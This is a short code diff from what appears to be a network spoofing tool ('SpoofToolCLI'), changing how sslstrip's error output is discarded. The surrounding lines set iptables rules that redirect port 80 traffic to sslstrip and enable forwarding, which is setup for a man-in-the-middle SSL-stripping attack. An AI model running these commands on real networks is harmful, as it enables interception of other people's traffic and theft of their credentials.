@@ -107,7 +107,7 @@ class SpoofToolCLI(cmd.Cmd):
         os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
         os.system("sudo iptables -A FORWARD -j ACCEPT")
         global ssl_process
-        ssl_process = subprocess.Popen("sudo python sslstrip-package/sslstrip.py", shell=True, stderr=subprocess.DEVNULL)
+        ssl_process = subprocess.Popen("sudo python sslstrip-package/sslstrip.py", shell=True, stderr=open(os.devnull, 'wb'))
         return
 
 
